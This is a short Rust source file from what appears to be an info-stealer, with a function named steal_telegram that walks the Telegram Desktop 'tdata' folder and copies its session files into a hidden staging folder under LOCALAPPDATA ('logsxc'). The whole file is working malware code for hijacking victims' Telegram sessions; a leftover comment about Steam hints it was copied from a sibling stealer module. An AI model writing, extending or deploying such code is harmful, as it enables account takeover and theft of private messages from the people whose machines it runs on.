use walkdir::*;

pub fn steal_telegram() -> Option<String>{

    let app_data = std::env::var("APPDATA").ok()?;

    if std::path::Path::new(&format!("{}\\Telegram Desktop\\tdata", app_data)).exists() {
        std::fs::create_dir(format!("{}\\logsxc\\telegram\\", &std::env::var("LOCALAPPDATA").unwrap())).unwrap();

        

        for entry in WalkDir::new(std::path::Path::new(&format!("{}\\Telegram Desktop\\tdata", app_data))).max_depth(3).into_iter().filter_map(|f| f.ok()) {
            std::fs::copy(entry.path(), &format!("{}\\logsxc\\telegram\\{}", &std::env::var("LOCALAPPDATA").unwrap(), entry.file_name().to_str().unwrap())).ok()?; // Copy Steam shit
        }

    }
    return Some("".to_string());

}